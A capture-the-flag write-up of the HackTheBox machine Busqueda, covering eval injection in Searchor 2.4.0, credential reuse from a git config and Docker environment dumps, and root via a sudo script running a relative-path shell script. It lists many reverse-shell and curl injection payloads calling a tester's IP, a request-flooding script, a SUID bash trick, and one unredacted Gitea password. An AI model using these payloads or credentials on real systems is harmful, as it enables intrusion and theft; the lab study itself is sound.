---
title: HackTheBox - Busqueda
author: 0
date: 2023-04-07 16:00:00 +0800
categories: [htb, machine]
tags: [command-injection, eval, python, git, gitea, docker, mysql, credential-reuse]
render_with_liquid: false
---

This machine starts off with a simple homepage where the user can search for a query and they can get redirected to a the site they selected. This website covers most commercial websites such as wikipedia, ebay, ...

![Homepage](/assets/img/htb-searcher-homepage.png)

 ## Reconnaissance

```bash
$ nmap -sC -sV  -A  -oN nmap_result 10.10.11.208
Starting Nmap 7.93 ( https://nmap.org ) at 2023-04-10 10:41 CEST
Nmap scan report for 10.10.11.208
Host is up (0.034s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 4fe3a667a227f9118dc30ed773a02c28 (ECDSA)
|_  256 816e78766b8aea7d1babd436b7f8ecc4 (ED25519)
80/tcp open  http    Apache httpd 2.4.52
|_http-server-header: Apache/2.4.52 (Ubuntu)
|_http-title: Did not follow redirect to http://searcher.htb/
Service Info: Host: searcher.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 17.05 seconds
```

Nothing too special here.

When looking around in the websites source code, we find the repository that is being used for the search functionality:
```html
 <p class="copyright">Powered by <a style="color:black" target='_blank' href="https://flask.palletsprojects.com">Flask</a> and <a  style="color:black" target='_blank' href="https://github.com/ArjunSharda/Searchor">Searchor 2.4.0</a> </p><br>
 ```

When going through the repository (release versions)[https://github.com/ArjunSharda/Searchor/releases], we find that v2.4.2 has patched a security vulnerability. When we look at the PR for this, we see that our version (v2.4.0) contains an `eval`statement:
>What is this Pull Request About?
>
>The simple change in this pull request replaces the execution of search method in the cli code from using eval to calling search on the specified engine by passing engine as an attribute of Engine class. Because enum in Python is a set of members, each being a key-value pair, the syntax for getting members is the same as passing a dictionary.
>
>What will this Pull Request Affect?
>
>This pull request removes the use of eval in the cli code, achieving the same functionality while removing vulnerability of allowing execution of arbitrary code.

```python
@click.argument("query")
def search(engine, query, open, copy):
    try:
        url = eval(
            f"Engine.{engine}.search('{query}', copy_url={copy}, open_web={open})"
        )
        click.echo(url)
        searchor.history.update(engine, query, url)
        if open:
            click.echo("opening browser...")
        if copy:
            click.echo("link copied to clipboard")
    except AttributeError:
        print("engine not recognized")
```

## Foothold
We can use this information to start building our payload.

We catch the search request in burp and then created a payloads file. This file will contain different potential payloads, which we will then run via a python script. We first run the 'test' value, afterwards we try to perform a curl to see if we get a hit, then we try some reverse shell syntax. On the third payload, we managed to get a reverse shell.

### payloads.txt
```
'test'
'+__import__('os').system('curl 10.10.14.57')+'
'+__import__('os').system('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.57 1234 >/tmp/f')+'
'+__import__('os').system('nc 10.10.14.57 1234 -e /bin/sh')+'
'+__import__('os').system('/bin/bash -i >& /dev/tcp/10.10.14.57/1234 0>&1')+'
'+__import__('os').system('0<&196;exec 196<>/dev/tcp/10.10.14.57/1234; /bin/bash <&196 >&196 2>&196')+'
'+__import__('os').system('sh -i >& /dev/tcp/10.10.14.57/1234 0>&1')+'
'+__import__('os').system('nc -c sh 10.10.14.57 1234')+'
';import os;os.system("curl 10.10.14.57");#'
";import os;os.system("curl 10.10.14.57");#"
"+import os;os.system("curl 10.10.14.57")+#"
';import+os;os.system("curl+10.10.14.57");#'
'+import+os;os.system("curl+10.10.14.57")+#'
'||import+os;os.system("curl+10.10.14.57")#'
'||import os;os.system("curl 10.10.14.57")#'
'__import__("os").system("curl 10.10.14.57")'
'+__import__('os').system('curl 10.10.14.57')+'
'+__import__('os').system('curl 10.10.14.57?$(whoami)')+'
'+__import__('os').system('curl http://10.10.14.57?$(whoami)')+'
'+__import__('os').system('curl http://10.10.14.57?$(whoami)')+'
'{}/{}{}{}?'.format('__im', 'port os\nos.', 'system("curl 10.10.14.57")', '') 
';import subprocess;subprocess.call(["curl", "10.10.14.57"]);#'
';__import__("os").system("wget -O /dev/null http://10.10.14.57:80/")#'
'__import__("os").system("nc 10.10.14.57 1234 -e /bin/bash")'
'";import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.57",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"]);'
"import requests;import base64;exec(requests.get('http://10.10.14.57:80/shell.py').text.encode().decode('base64'))"
'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.57",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
'__import__("os").system("nc 10.10.14.57 1234 -e /bin/sh")'
```

### search.py
```python
import requests
import urllib.parse

url = "http://searcher.htb/search"
headers = {"User-Agent":"Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0", "Content-Type":"application/x-www-form-urlencoded"}

def do_request(payload):
        data = f"engine=Apple&query={payload}&auto_redirect="
        response = requests.post(url, headers=headers, data=data)
        print(f"{payload} - {response.status_code}")
with open("payloads.txt") as file:
    for line in file:
        payload = line.strip()
        do_request(payload)
        # Try encoded version, not necessary for this machine
        do_request(urllib.parse.quote(payload))
```

### Output
```bash
$ python3 search.py
'test' - 302
%27test%27 - 302
'+__import__('os').system('curl 10.10.14.57')+' - 302
%27%2B__import__%28%27os%27%29.system%28%27curl%2010.10.14.57%27%29%2B%27 - 404
'+__import__('os').system('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.57 1234 >/tmp/f')+' - 302

```

## Lateral Movement

Once we gain a shell, we can search around. In the `/home/svc/` directory, we can see a `.git` folder.

```bash
$ ls -lah
total 20K
drwxr-xr-x 4 www-data www-data 4.0K Apr  3 14:32 .
drwxr-xr-x 4 root     root     4.0K Apr  4 16:02 ..
-rw-r--r-- 1 www-data www-data 1.1K Dec  1 14:22 app.py
drwxr-xr-x 8 www-data www-data 4.0K Apr 10 06:44 .git
drwxr-xr-x 2 www-data www-data 4.0K Dec  1 14:35 templates
$ ls
branches
COMMIT_EDITMSG
config
description
HEAD
hooks
index
info
logs
objects
refs
```

There we can find a config file that might contain interesting credentials.

```bash
$ cat config
[core]
        repositoryformatversion = 0
        filemode = true
        bare = false
        logallrefupdates = true
[remote "origin"]
        url = http://cody:jh1**REDACTED**2@gitea.searcher.htb/cody/Searcher_site.git
        fetch = +refs/heads/*:refs/remotes/origin/*
[branch "main"]
        remote = origin
        merge = refs/heads/main
```

We can use these credentials to login into svc and inspect further.

```bash
$ ssh svc@10.10.11.208
```

## Privilege Escalation

```bash
svc@busqueda:~$ whoami
svc
svc@busqueda:~$ sudo -l
[sudo] password for svc: 
Matching Defaults entries for svc on busqueda:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
    use_pty

User svc may run the following commands on busqueda:
    (root) /usr/bin/python3 /opt/scripts/system-checkup.py *
svc@busqueda:~$ sudo -u root  /usr/bin/python3 /opt/scripts/system-checkup.py *
Usage: /opt/scripts/system-checkup.py <action> (arg1) (arg2)

     docker-ps     : List running docker containers
     docker-inspect : Inpect a certain docker container
     full-checkup  : Run a full system checkup

```

We notice the `/opt/scripts/system-checkup.py` can be ran by root. By playing around with this script, we managed to pull out data from the running docker instances.

The Gitea instance:

```bash
svc@busqueda:~$ sudo -u root  /usr/bin/python3 /opt/scripts/system-checkup.py docker-ps
CONTAINER ID   IMAGE                COMMAND                  CREATED        STATUS              PORTS                                             NAMES
960873171e2e   gitea/gitea:latest   "/usr/bin/entrypoint…"   3 months ago   Up About a minute   127.0.0.1:3000->3000/tcp, 127.0.0.1:222->22/tcp   gitea
f84a6b33fb5a   mysql:8              "docker-entrypoint.s…"   3 months ago   Up About a minute   127.0.0.1:3306->3306/tcp, 33060/tcp               mysql_db

svc@busqueda:~$ sudo -u root  /usr/bin/python3 /opt/scripts/system-checkup.py docker-inspect --format='{{json .Config}}' 960873171e2e
--format={"Hostname":"960873171e2e","Domainname":"","User":"","AttachStdin":false,"AttachStdout":false,"AttachStderr":false,"ExposedPorts":{"22/tcp":{},"3000/tcp":{}},"Tty":false,"OpenStdin":false,"StdinOnce":false,"Env":["USER_UID=115","USER_GID=121","GITEA__database__DB_TYPE=mysql","GITEA__database__HOST=db:3306","GITEA__database__NAME=gitea","GITEA__database__USER=gitea","GITEA__database__PASSWD=y**REDACTED**h","PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin","USER=git","GITEA_CUSTOM=/data/gitea"],...}}
```

We can do the same for the MySQL container:

```bash
svc@busqueda:~$ sudo -u root  /usr/bin/python3 /opt/scripts/system-checkup.py docker-inspect --format='{{json .Config}}' f84a6b33fb5a
--format={"Hostname":"f84a6b33fb5a","Domainname":"","User":"","AttachStdin":false,"AttachStdout":false,"AttachStderr":false,"ExposedPorts":{"3306/tcp":{},"33060/tcp":{}},"Tty":false,"OpenStdin":false,"StdinOnce":false,"Env":["MYSQL_ROOT_PASSWORD=j**REDACTED**F","MYSQL_USER=gitea","MYSQL_PASSWORD=y**REDACTED**h","MYSQL_DATABASE=gitea","PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin",...}}

```

We gained some more credentials we might be able to reuse later:
```
"GITEA__database__NAME=gitea",
"GITEA__database__USER=gitea",
"GITEA__database__PASSWD=y**REDACTED**h"
"MYSQL_ROOT_PASSWORD=j**REDACTED**F",
"MYSQL_USER=gitea",
"MYSQL_PASSWORD=y**REDACTED**h",
"MYSQL_DATABASE=gitea"
```

At this point, there are a few routes you can take to move further but also a few rabbit holes.

### MySQL
We now have access to the MySQL database, where we can export all the MySQL users.

```bash
svc@busqueda:~$ mysql -h 127.0.0.1 -u root -p
Enter password: 
Welcome to the MySQL monitor.  Commands end with ; or \g.
Your MySQL connection id is 146849
Server version: 8.0.31 MySQL Community Server - GPL

Copyright (c) 2000, 2023, Oracle and/or its affiliates.

Oracle is a registered trademark of Oracle Corporation and/or its
affiliates. Other names may be trademarks of their respective
owners.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

mysql> show databases;
+--------------------+
| Database           |
+--------------------+
| gitea              |
| information_schema |
| mysql              |
| performance_schema |
| sys                |
+--------------------+
5 rows in set (0.00 sec)

mysql> use mysql;
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
mysql> select * from user;
```

In the user database we notice two accounts, along with their password hashes:
```
cody@gitea.searcher.htb
administrator@gitea.searcher.htb
```

This can be a rabbit hole as I wasted a lot of time trying to do [privilege escalation from MySQL](https://book.hacktricks.xyz/network-services-pentesting/pentesting-mysql#privilege-escalation) or trying to crack the hashes.

### Git
Another route to progress was checking out the commits on the git repository we found earlier:
```bash
svc@busqueda:~$ git clone http://cody:jh1usoih2bkjaspwe92@gitea.searcher.htb/cody/Searcher_site.git
Cloning into 'Searcher_site'...
remote: Enumerating objects: 5, done.
remote: Counting objects: 100% (5/5), done.
remote: Compressing objects: 100% (4/4), done.
remote: Total 5 (delta 0), reused 0 (delta 0), pack-reused 0
Receiving objects: 100% (5/5), done.
svc@busqueda:~$ cd Searcher_site/
svc@busqueda:~/Searcher_site$ git log
commit 5ede9ed9f2ee636b5eb559fdedfd006d2eae86f4 (HEAD -> main, origin/main, origin/HEAD)
Author: administrator <administrator@gitea.searcher.htb>
Date:   Sun Dec 25 12:14:21 2022 +0000

    Initial commit
```

Again we notice there are two accounts:
```
cody@gitea.searcher.htb
administrator@gitea.searcher.htb
```

### Gitea

We can go to `gitea.searcher.htb` in the browser, if we add it to our `/etc/hosts` file. We used one of the earlier found credentials to log into the `administrator@gitea.searcher.htb` account. We can't seem to be able to do any commits ourselves but we can now see the contents the files that can be ran as sudo.

![Gitea](/assets/img/htb-searcher-gitea.png)

#### system-checkup.py
We notice the logic of the `system-checkup.py` script expects the "full-checkup" action to be provided `./full-checkup.sh` as an argument. We can create our own `full-checkup.sh` script to execute arbitrary commands as sudo.

```python
    elif action == 'docker-ps':
        try:
            arg_list = ['docker', 'ps']
            print(run_command(arg_list)) 
        
        except:
            print('Something went wrong')
            exit(1)

    elif action == 'full-checkup':
        try:
            arg_list = ['./full-checkup.sh']
            print(run_command(arg_list))
            print('[+] Done!')
        except:
            print('Something went wrong')
            exit(1)
```


We can create a malicious script that will be executed by the sudo command we can add a SUID to `/bin/bash` to make it execute commands as root.
>When you run a command with SUID (Set User ID) permission, the command is executed with the privileges of the file owner instead of the privileges of the user who is running the command. This means that if a file has SUID permission and is owned by root, then any user who runs that file will effectively have root privileges for the duration of the command.

Another payload could be setting up a reverse shell in the script. 

### Weaponizing full-checkup.sh

```bash
svc@busqueda:~$ pwd
/home/svc
svc@busqueda:~$ vi full-checkup.sh 
svc@busqueda:~$ chmod +x full-checkup.sh
svc@busqueda:~$ cat full-checkup.sh 
#!/bin/bash
chmod +s /bin/bash
svc@busqueda:~$ sudo -u root /usr/bin/python3 /opt/scripts/system-checkup.py full-checkup './full-checkup.sh'

[+] Done!
svc@busqueda:~$ bash -p
svc@busqueda:~# whoami
root
svc@busqueda:~# cat /root/root.txt
0f3**REDACTED**d32

```

Or we can set up a reverse shell to connect to our `netcat` listener:

```bash
svc@busqueda:~$ cat full-checkup.sh 
#!/bin/bash
bash -i >& /dev/tcp/10.10.14.44/1234 0>&1
svc@busqueda:~/$ sudo -u root /usr/bin/python3 /opt/scripts/system-checkup.py full-checkup
```

We now have a root shell:

```bash
$ nc -lvnp 1234
listening on [any] 1234 ...
connect to [10.10.14.44] from (UNKNOWN) [10.10.11.208] 56760
root@busqueda:/home/svc/# cat /root/root.txt
0f3**REDACTED**d32
```